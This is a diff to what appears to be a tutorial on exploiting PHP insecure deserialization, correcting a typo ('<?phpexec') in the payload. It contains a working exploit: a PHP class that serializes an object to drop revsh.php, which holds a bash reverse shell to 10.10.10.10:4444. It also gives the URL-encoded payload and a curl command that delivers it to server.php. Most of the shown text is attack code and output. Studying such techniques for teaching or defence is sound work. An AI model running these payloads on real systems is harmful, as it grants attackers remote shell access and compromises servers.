@@ -225,7 +225,7 @@ To exploit this we can craft a ```user_input`` input as a serialized object that
 class DatabaseExport
 {
     public $user_file='revsh.php';
-    public $data='<?phpexec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\'"); ?>';
+    public $data='<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\'"); ?>';
 }
 print("serialized object:\n");
 print(serialize(new DatabaseExport));
@@ -239,16 +239,16 @@ As shown above, the ```data``` variable contains the reverse shell and the ```us
 
 ```console
 serialized object:
-O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"revsh.php";s:4:"data";s:73:"<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"); ?>";}
+O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"revsh.php";s:4:"data";s:73:"<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"); ?>";}
 
 serialized object with encoding:
-O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphpexec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
+O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
 ```
 
 Now we can pass the encoded string into the ```user_input``` variable as follows:
 
 ```console
-kali@kali:~$ curl -i http://example.com/server.php?user_input=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphpexec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
+kali@kali:~$ curl -i http://example.com/server.php?user_input=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
 ```
 
 This will write the file to the root of the server. The file that's copied (revsh.php) can now be executed simply by navigating to ```http://example.com/revsh.php``` and the reverse shell can be caught with a listener.
